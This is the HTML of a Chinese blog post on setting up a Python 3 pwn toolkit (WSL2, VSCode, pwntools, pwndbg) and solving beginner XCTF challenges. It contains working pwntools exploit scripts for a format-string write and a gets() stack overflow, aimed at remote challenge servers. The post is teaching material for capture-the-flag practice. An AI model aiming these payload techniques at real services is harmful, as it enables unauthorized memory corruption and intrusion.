@@ -1,0 +1,1021 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#636363">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/wztb.ico?v=">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/wztb.ico?v=">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=" color="#636363">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00 前言随着进入全面建成小康社会的最后一年，Python2也正式停止了支持。网上的pwn基础教程很多都过时了，写着peda、pwntools、pwndbg等只支持py2，现在看起来是不太对，迁移是大势所趋，很多项目尤其是大项目早就完成了向py3的迁移，有图为证。最近宅在家里又比较闲，想着能不能把环境迁移到py3上，一番折腾后感觉还不错，故把自己踩到的坑写下来，也写一篇基础教程。我就是ecli">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="py3+VSCode+WSL2的pwn环境配置与使用">
+<meta property="og:url" content="https://blog.fe1yu.com/2020/01/28/py3-VSCode-WSL2的pwn环境配置与测试/index.html">
+<meta property="og:site_name" content="fe1yu&#39;blog">
+<meta property="og:description" content="0x00 前言随着进入全面建成小康社会的最后一年，Python2也正式停止了支持。网上的pwn基础教程很多都过时了，写着peda、pwntools、pwndbg等只支持py2，现在看起来是不太对，迁移是大势所趋，很多项目尤其是大项目早就完成了向py3的迁移，有图为证。最近宅在家里又比较闲，想着能不能把环境迁移到py3上，一番折腾后感觉还不错，故把自己踩到的坑写下来，也写一篇基础教程。我就是ecli">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://s2.ax1x.com/2020/01/30/11BsL8.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2020/01/30/11Brsf.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2020/01/30/11BDQP.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2020/01/30/11B6eS.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2020/01/30/11BRij.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2020/01/30/11Bcdg.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2020/01/30/11BgoQ.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2020/01/31/18mxp9.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2020/01/31/18mjfJ.jpg">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190501015213398.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/01/31/18mXY4.jpg">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019082717285142.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/01/31/18mOkF.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2020/01/31/18mqTU.jpg">
+<meta property="og:updated_time" content="2020-01-31T15:20:16.350Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="py3+VSCode+WSL2的pwn环境配置与使用">
+<meta name="twitter:description" content="0x00 前言随着进入全面建成小康社会的最后一年，Python2也正式停止了支持。网上的pwn基础教程很多都过时了，写着peda、pwntools、pwndbg等只支持py2，现在看起来是不太对，迁移是大势所趋，很多项目尤其是大项目早就完成了向py3的迁移，有图为证。最近宅在家里又比较闲，想着能不能把环境迁移到py3上，一番折腾后感觉还不错，故把自己踩到的坑写下来，也写一篇基础教程。我就是ecli">
+<meta name="twitter:image" content="https://s2.ax1x.com/2020/01/30/11BsL8.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://blog.fe1yu.com/2020/01/28/py3-VSCode-WSL2的pwn环境配置与测试/"/>
+
+
+
+
+
+  <title>py3+VSCode+WSL2的pwn环境配置与使用 | fe1yu'blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">fe1yu'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">三思而行，及时止损</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.fe1yu.com/2020/01/28/py3-VSCode-WSL2的pwn环境配置与测试/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="fe1yu">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/joker.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fe1yu'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">py3+VSCode+WSL2的pwn环境配置与使用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-28T22:33:10+08:00">
+                2020-01-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/学习小记/" itemprop="url" rel="index">
+                    <span itemprop="name">学习小记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-thermometer-three-quarters" aria-hidden="true"></i> 热度
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>℃
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                  <span class="post-meta-divider">|</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3k字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  11分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>随着进入全面建成小康社会的最后一年，Python2也正式停止了支持。网上的pwn基础教程很多都过时了，写着peda、pwntools、pwndbg等只支持py2，现在看起来是不太对，迁移是大势所趋，很多项目尤其是大项目早就完成了向py3的迁移，有图为证。最近宅在家里又比较闲，想着能不能把环境迁移到py3上，一番折腾后感觉还不错，故把自己踩到的坑写下来，也写一篇基础教程。我就是eclipse插件拉满卡死，Vim快捷键记到头秃我也不会用VSCode，哎呀妈呀，真香。至于为什么选择VSCode，那肯定是因为它火，蹭它热度呗。（大雾）在WSL里可以很方便的访问hostOS的文件，而且WSL2使用了完整的的Linux内核，其本质就是基于hyper-V的虚拟机，考虑到兼容性问题故选用WSL2。再辅以Windows Terminal简直破费。话不多说，整。<a href="https://imgchr.com/i/11BsL8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/30/11BsL8.jpg" alt="11BsL8.jpg"></a><br><a href="https://imgchr.com/i/11Brsf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/30/11Brsf.jpg" alt="11Brsf.jpg"></a><br><a href="https://imgchr.com/i/11BDQP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/30/11BDQP.jpg" alt="11BDQP.jpg"></a></p>
+<h1 id="0x01-WSL2的安装"><a href="#0x01-WSL2的安装" class="headerlink" title="0x01 WSL2的安装"></a>0x01 WSL2的安装</h1><p>控制面板→程序→启用或关闭windows功能→勾选适用Linux的Windows子系统，重启。WSL2与WSL1不一样，第一次使用虚拟机的同学可能需要进入BIOS开启硬件虚拟化，不同的机型具体操作不同，搜索引擎对症下药即可。</p>
+<p><a href="https://imgchr.com/i/11B6eS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/30/11B6eS.jpg" alt="11B6eS.jpg"></a></p>
+<p>命令行输入<code>WSL --set-default-version 2</code>把WSL2设置为默认WSL，也可以为不同的发行版指定不同的WSL版本，也可以互相转换，具体操作键入 <code>WSL -h</code>查看。</p>
+<p>Windows应用商店提供了若干个发行版，我们选用Ubuntu，直接搜索Ubuntu就可以，默认的是18.04，你也可以安装16.04。安装包都只有小几百MB，官方打包，干净的一比。Ubuntu18.04默认已经不提供py2了，只提供py3。还可以顺手在应用商店里安装一个Windows Terminal，美观易用，关于Windows Terminal的配置网上也有教程。在Windows Terminal或者PowerShell里键入WSL即可启动默认发行版。</p>
+<p><img src="https://s2.ax1x.com/2020/01/30/11BRij.jpg" alt="11BRij.jpg"></p>
+<p>tips：如果报可能是因为Windows操作系统版本较低，更新一下或者加入Windows预览体验计划。</p>
+<h1 id="0x02-Linux的配置"><a href="#0x02-Linux的配置" class="headerlink" title="0x02 Linux的配置"></a>0x02 Linux的配置</h1><p>鉴于网络环境，可以把软件源还有pip源都换成国内，网上教程很多，不再赘述。</p>
+<p>安装并更新pip3</p>
+<p><code>sudo apt install python3-pip`</code></p>
+<p><code></code>python3 -m pip install –upgrade pip`</p>
+<p>后续使用pip3的时候可能会出现如下报错</p>
+<p><code>Traceback (most recent call last): File &quot;/usr/bin/pip3&quot;, line 9</code></p>
+<p>经查这是pip 10.0.0版本的BUG，现在可能已经修复了。解决方法：修改 <strong>/usr/bin/pip</strong> 文件</p>
+<p>before</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pip <span class="keyword">import</span> main</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>
+<p>after</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pip <span class="keyword">import</span> __main__</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    sys.exit(__main__._main())</span><br></pre></td></tr></table></figure>
+<p>由于是64位系统，所以添加32位支持</p>
+<p><code>sudo dpkg --add-architecture i386</code></p>
+<p><code>sudo apt-get update</code></p>
+<p><code>sudo apt-get -y install libc6-i386</code></p>
+<p>这个Ubuntu比较干净 也没有gdb给他整一个</p>
+<p><code>sudo apt-get -y install git gdb</code></p>
+<p>安装ROPgadget</p>
+<p><code>sudo pip install capstone</code></p>
+<p><code>pip install ropgadget</code></p>
+<p>安装one_gadget</p>
+<p><code>sudo apt-get -y install ruby</code></p>
+<p><code>sudo gem install one_gadget</code></p>
+<p>下载源码以供调试具体怎样调试源码可以去问搜索引擎</p>
+<p><code>apt install libc6-dbg</code></p>
+<p><code>apt install libc6-dbg:i386</code></p>
+<p><code>apt source libc6-dev</code></p>
+<p>安装libcsearcher</p>
+<p><code>git clone https://github.com/lieanu/LibcSearcher.git</code></p>
+<p><code>cd LibcSearcher</code></p>
+<p><code>python3 setup.py develop</code></p>
+<p>增强gdb插件的插件有很多，peda、gef、pwndbg、pwngdb，这些插件各有所长。由于各种各样的问题尝试同时安装多个插件在使用的时候总是出现bug（还是我太菜，解决不了兼容问题，哭唧唧），所以你可以安装多个但每次只用一个，通过改写<strong>.gdbinit</strong>文件控制每次加载的插件，这里只安装pwndbg。</p>
+<p><code>git clone https://github.com/pwndbg/pwndbg</code></p>
+<p><code>cd pwndbg</code></p>
+<p><code>./setup.sh</code></p>
+<p>命令行输入<code>gdb</code>测试正常，可能有的小伙伴会报错，这时查看一下你的gdb使用的py是什么版本，大家都是py3就很好说话了。</p>
+<p><a href="https://imgchr.com/i/11Bcdg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/30/11Bcdg.jpg" alt="11Bcdg.jpg"></a></p>
+<p>安装pwntools。</p>
+<p><code>apt-get update</code></p>
+<p><code>apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</code></p>
+<p><code>python3 -m pip install --upgrade pip</code></p>
+<p><code>python3 -m pip install --upgrade git+https://github.com/Gallopsled/pwntools.git@dev</code></p>
+<p>上述过程可能会有报错，认真阅读报错信息，利用搜索引擎就可以解决的问题都不是问题。（逃  😈</p>
+<p>tips：由于网络原因使用git可能并不顺畅，可以git挂代理或者直接下载.zip文件离线安装。</p>
+<h1 id="0x03-VSCode的安装及使用"><a href="#0x03-VSCode的安装及使用" class="headerlink" title="0x03 VSCode的安装及使用"></a>0x03 VSCode的安装及使用</h1><p>进入VSCode官网<a href="https://code.visualstudio.com，stable和insiders版本二选一，如果stable不支持远程开发的话那就装insiders版本。安装完WSL2再安装VSCode首次进入后会推荐你安装==Remote" target="_blank" rel="noopener">https://code.visualstudio.com，stable和insiders版本二选一，如果stable不支持远程开发的话那就装insiders版本。安装完WSL2再安装VSCode首次进入后会推荐你安装==Remote</a> - WSL==插件，或者去插件市场搜索这个插件或者==Remote Development==插件。然后安装一些常用插件，例如python插件，c/c++插件，中文插件等。单击二者其一就可以连接到Ubuntu并访问其中文件。</p>
+<p><img src="https://s2.ax1x.com/2020/01/30/11BgoQ.jpg" alt="11BgoQ.jpg"></p>
+<p>我们写一个测试脚本，点击文件→新建文件→然后选择python语言以及python3。写完可以直接在VSCode的终端里运行，测试成功如图。</p>
+<p><img src="https://s2.ax1x.com/2020/01/31/18mxp9.jpg" alt="18mxp9.jpg"></p>
+<p>至于Windows平台下的ida，ollydbg等调试器的安装，比较简单，不再赘述。</p>
+<h1 id="0x04-简单实战"><a href="#0x04-简单实战" class="headerlink" title="0x04 简单实战"></a>0x04 简单实战</h1><p>本文虽是一篇基础教程，但肯定不能从汇编语言说起，这里拿XCTF新手入门的几个pwn题为例，简单介绍一下pwn题的解题方法。不啰嗦，盘它。</p>
+<h2 id="0x00-get-shell"><a href="#0x00-get-shell" class="headerlink" title="0x00 get shell"></a>0x00 get shell</h2><p>直接ida打开F5，看完代码你应该就去学习Linux下nc命令的使用。</p>
+<h2 id="0x01-CGfsb"><a href="#0x01-CGfsb" class="headerlink" title="0x01 CGfsb"></a>0x01 CGfsb</h2><p>一般情形下拿到文件先checksec一下，看开启了哪些保护机制。这里简单介绍下几个选项的含义。</p>
+<p><img src="https://s2.ax1x.com/2020/01/31/18mjfJ.jpg" alt="18mjfJ.jpg"></p>
+<blockquote>
+<p><strong>Arch</strong>：平台或指令集，位数32或64，大端序还是小端序。</p>
+<p><strong>RELRO</strong>：RELocation Read-Only，只读重定位。分为Partial RELRO(部分RELRO)和 Full RELRO (完整RELRO)。开启Partial RELRO的话GOT表是可写的；开启 FULL RELRO 的话GOT表是只读的。</p>
+<p><strong>Stack</strong>：canary found 一种栈防护机制，如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过。</p>
+<p><strong>NX</strong>：NX(Non-Executable Memory，不可执行内存)类似于windows中的DEP(Data Execution Prevention，数据执行保护)。</p>
+<p><strong>PIE</strong>：随机化ELF装载内存的基址（代码段、plt、got、data等共同的基址）但与ASLR是有区别的，ASLR 不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责。但是只有在开启 ASLR 之后，PIE 才会生效。</p>
+</blockquote>
+<p>用ida打开F5看代码，聪明的你发现只要让pwmme等于8就可以开shell拿flag了，但是程序并没有让你输入其值。这里我们可以利用格式化字符串写内存的漏洞。</p>
+<blockquote>
+<p><strong>%n</strong>：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p>
+<p>%<strong>n$</strong>：表示的是获取格式化字符串中的第n个指定参数</p>
+</blockquote>
+<p>所以我们需要知道pwmme的地址，在ida中双击此变量名即可快速跳转，发现其在bss段。地址为0x804a068。</p>
+<p><img src="https://img-blog.csdnimg.cn/20190501015213398.png" alt=""></p>
+<p>接下来就要确定偏移了，对简单的方法就是输入形如<code>AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x</code>的格式化字符串。</p>
+<p><img src="https://s2.ax1x.com/2020/01/31/18mXY4.jpg" alt="18mXY4.jpg"></p>
+<p>A的ascii码16进制值正是0x41，数一数就知道AAAA相对于格式化字符串的偏移量是10，然后写exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="number">46753</span>)</span><br><span class="line">pwnme_addr = <span class="number">0x0804A068</span></span><br><span class="line">payload1 = <span class="string">'fe1yu'</span></span><br><span class="line">payload2 = p32(pwnme_addr)+<span class="string">'abcd'</span>+<span class="string">'%10$n'</span></span><br><span class="line">p.recvuntil(<span class="string">'please tell me your name:\n'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'leave your message please:\n'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="keyword">print</span> (p.recv())</span><br><span class="line"><span class="keyword">print</span> (p.recv())</span><br></pre></td></tr></table></figure>
+<p>为什么要这么写呢?p32会把0x0804A068打包成32位系统的地址，也就是4个字节，这也是为什么用4个A测试毕竟占用四字节，abcd也是4个字节，刚好使pwnme等于8。为什么写两个print是因为一次输出name，一次输出message。运行脚本，BOOM！报错，为什么呢？其实这里有一个坑就是py3是默认UTF-8编码的，一个字符占用空间并不是1字节，所以你的字符串并不是4字节，这时候需要强制类型转换，在字符串前加一个<strong>b</strong>，正确exp如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="number">32386</span>)</span><br><span class="line">pwnme_addr = <span class="number">0x0804A068</span></span><br><span class="line">payload1 = <span class="string">'abcd'</span></span><br><span class="line">payload2 = p32(pwnme_addr)+<span class="string">b'abcd'</span>+<span class="string">b'%10$n'</span></span><br><span class="line">p.recvuntil(<span class="string">'please tell me your name:\n'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'leave your message please:\n'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="keyword">print</span> (p.recv())</span><br><span class="line"><span class="keyword">print</span> (p.recv())</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-when-did-you-born"><a href="#0x02-when-did-you-born" class="headerlink" title="0x02 when_did_you_born"></a>0x02 when_did_you_born</h2><p>还是老一套，checksec一下，idaF5看一下伪C代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> name; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> input_birth; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's Your Birth?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;input_birth);</span><br><span class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( input_birth == <span class="number">1926</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You Cannot Born In 1926!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"What's Your Name?"</span>);</span><br><span class="line">    gets((__int64)&amp;name);                       <span class="comment">// stack overflow here</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You Are Born In %d\n"</span>, input_birth);</span><br><span class="line">    <span class="keyword">if</span> ( input_birth == <span class="number">1926</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You Shall Have Flag."</span>);</span><br><span class="line">      system(<span class="string">"cat flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You Are Naive."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You Speed One Second Here."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看过代码后聪明的你又发现了只要输入的birth要为1926就能得到flag，可是他又不让你在1962出生，怎么办呢。你又看到了gets获取name，盲生，你发现了华点！本题是一道栈溢出题目，刚开始birth我们只需要输入一个非1926值就可以了，输入name的时候再把它覆盖成1926。能不能行呢，用ida可以看到两个变量相差了8字节，这就明白了，写exp。</p>
+<p><img src="https://img-blog.csdnimg.cn/2019082717285142.png" alt=""></p>
+<p>checksec的时候你肯定发现了这是一个64位程序，所以使用p64，0x786就是1926的16进制表示。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">31876</span>)</span><br><span class="line">birth = <span class="string">"1927"</span></span><br><span class="line">name = <span class="string">b'aaaaaaaa'</span>+ p64(<span class="number">0x00000786</span>)</span><br><span class="line">p.recvuntil(<span class="string">"What's Your Birth?"</span>)</span><br><span class="line">p.sendline(birth)</span><br><span class="line">p.recvuntil(<span class="string">"What's Your Name?"</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"><span class="keyword">print</span> (p.recv())</span><br><span class="line"><span class="keyword">print</span> (p.recv())</span><br><span class="line"><span class="keyword">print</span> (p.recv())</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-hello-pwn"><a href="#0x03-hello-pwn" class="headerlink" title="0x03 hello_pwn"></a>0x03 hello_pwn</h2><p>还是checksec+idaF5，找到main函数，好奇心让你点开sub_400686()看一看，一下子你又找到了flag的获取方，只要满足dword_60106C == 1853186401就行。</p>
+<p><img src="https://s2.ax1x.com/2020/01/31/18mOkF.jpg" alt=""></p>
+<p><img src="https://s2.ax1x.com/2020/01/31/18mqTU.jpg" alt="18mqTU.jpg"></p>
+<p>但你仔细一看，特喵的没地方让我输入dword_60106C 啊，你又仔细一看，发现了上面有个&amp;unk_601068，你跟进去一看，4字节大小，而且这俩小伙距离挺近，都位于一个叫bss段的东西上，哎这时候我告诉你这个也能溢出，你一下恍然大悟，exp在脑海瞬间就写好了。</p>
